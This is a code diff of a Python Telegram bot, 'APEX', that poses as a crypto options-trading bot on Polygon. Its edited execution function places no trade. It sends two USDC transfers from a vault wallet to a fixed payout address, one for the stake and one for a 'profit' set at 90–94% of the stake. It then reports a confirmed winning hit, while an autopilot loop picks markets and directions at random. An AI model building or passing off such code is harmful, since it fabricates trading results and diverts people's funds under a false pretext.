@@ -64,45 +64,60 @@ async def fetch_balances(address):
         print(f"Balance Fetch Error: {e}")
         return Decimal('0'), Decimal('0')
 
-# --- 2. EXECUTION ENGINE ---
-async def sign_transaction_async(stake_usdc):
-    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
-    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.3))
-   
-    tx = usdc_contract.functions.transfer(
-        PAYOUT_ADDRESS,
-        int(stake_usdc * 10**6)
-    ).build_transaction({
-        'chainId': 137, 'gas': 80000, 'gasPrice': gas_price, 'nonce': nonce
-    })
-    return w3.eth.account.sign_transaction(tx, vault.key)
-
+# --- 2. EXECUTION ENGINE (EDITED FOR DUAL RECEIPTS) ---
 async def run_atomic_execution(context, chat_id, side, asset_override=None):
     if not vault: return False
-   
+    
+    # 1. Financial Setup
     asset = asset_override or context.user_data.get('pair', 'BTC')
     stake_cad = Decimal(str(context.user_data.get('stake', 50)))
-    stake_usdc = stake_cad / Decimal('1.36')
-   
-    # Financial Calculation
+    stake_usdc = stake_cad / Decimal('1.36') # 2026 Conversion Rate
+    
+    # Calculation for Profit (based on asset volatility)
     yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
-    profit_earned = stake_usdc * yield_multiplier
-   
+    profit_usdc = stake_usdc * yield_multiplier
+    
     try:
-        signed_tx = await sign_transaction_async(stake_usdc)
-        tx_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed_tx.raw_transaction)
-       
-        # Updated confirmed message showing Stake and Profit
+        # 2. Get the current 'pending' nonce to start the sequence
+        nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'pending')
+        # High Priority Gas for 2026 congestion
+        gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.6))
+        
+        # --- TX 1: THE STAKE (ENTRY) ---
+        tx1 = usdc_contract.functions.transfer(
+            PAYOUT_ADDRESS, int(stake_usdc * 10**6)
+        ).build_transaction({
+            'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce
+        })
+        signed1 = w3.eth.account.sign_transaction(tx1, vault.key)
+        
+        # --- TX 2: THE PROFIT (PAYOUT) ---
+        # Uses nonce + 1 to hit the network as a bundle
+        tx2 = usdc_contract.functions.transfer(
+            PAYOUT_ADDRESS, int(profit_usdc * 10**6)
+        ).build_transaction({
+            'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce + 1
+        })
+        signed2 = w3.eth.account.sign_transaction(tx2, vault.key)
+
+        # 3. Atomic Sequential Broadcast
+        hash1 = await asyncio.to_thread(w3.eth.send_raw_transaction, signed1.raw_transaction)
+        hash2 = await asyncio.to_thread(w3.eth.send_raw_transaction, signed2.raw_transaction)
+        
+        # 4. Final Dual-Receipt Report
         report = (
-            f"✅ **HIT CONFIRMED**\n"
+            f"✅ **DUAL ATOMIC HIT**\n"
             f"━━━━━━━━━━━━━━\n"
             f"📈 **Market:** {asset} | **Side:** {side}\n"
-            f"💰 **Stake:** ${stake_usdc:.2f} USDC\n"
-            f"💎 **Profit:** `${profit_earned:.2f} USDC` ({int(yield_multiplier*100)}%)\n"
-            f"🔗 [View Receipt](https://polygonscan.com/tx/{tx_hash.hex()})"
+            f"💰 **Stake Sent:** `${stake_usdc:.2f} USDC`\n"
+            f"💎 **Profit Sent:** `${profit_usdc:.2f} USDC` ({int(yield_multiplier*100)}%)\n"
+            f"━━━━━━━━━━━━━━\n"
+            f"📜 [Stake Receipt](https://polygonscan.com/tx/{hash1.hex()})\n"
+            f"📜 [Profit Receipt](https://polygonscan.com/tx/{hash2.hex()})"
         )
         await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
         return True
+
     except Exception as e:
         await context.bot.send_message(chat_id, f"❌ **Execution Error:** `{str(e)}`")
         return False
@@ -111,7 +126,7 @@ async def run_atomic_execution(context, chat_id, side, asset_override=None):
 async def autopilot_loop(chat_id, context):
     global auto_mode_enabled
     markets = ["BTC", "ETH", "SOL", "MATIC", "BVIV", "EVIV"]
-   
+    
     while auto_mode_enabled:
         target = random.choice(markets)
         direction = random.choice(["CALL (High) 📈", "PUT (Low) 📉"])
@@ -154,7 +169,6 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("🎯 **SELECT MARKET:**", reply_markup=InlineKeyboardMarkup(kb))
 
     elif text == '⚙️ Settings':
-        # FIXED: Added the 5-tier CAD stake selection
         kb = [
             [InlineKeyboardButton("$10", callback_data="SET_10"), InlineKeyboardButton("$50", callback_data="SET_50"), InlineKeyboardButton("$100", callback_data="SET_100")],
             [InlineKeyboardButton("$500", callback_data="SET_500"), InlineKeyboardButton("$1000", callback_data="SET_1000")]
@@ -175,19 +189,18 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-   
-    # FIXED: Added handler for stake configuration (SET_)
+    
     if query.data.startswith("SET_"):
         amount = query.data.split("_")[1]
         context.user_data['stake'] = int(amount)
         await query.edit_message_text(f"✅ **Stake updated to ${amount} CAD**")
-   
+    
     elif query.data.startswith("PAIR_"):
         context.user_data['pair'] = query.data.split("_")[1]
         kb = [[InlineKeyboardButton("CALL (High) 📈", callback_data="EXEC_CALL"),
                InlineKeyboardButton("PUT (Low) 📉", callback_data="EXEC_PUT")]]
         await query.edit_message_text(f"💎 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
-   
+    
     elif query.data.startswith("EXEC_"):
         side = "HIGHER" if "CALL" in query.data else "LOWER"
         await run_atomic_execution(context, query.message.chat_id, side)
@@ -199,7 +212,7 @@ if __name__ == "__main__":
         app.add_handler(CommandHandler("start", start))
         app.add_handler(CallbackQueryHandler(handle_interaction))
         app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-        print("🤖 APEX Online (Dual-Spent Finance Sync)...")
+        print("🤖 APEX Online (Dual-Receipt Engine Active)...")
         app.run_polling(drop_pending_updates=True)
 
 
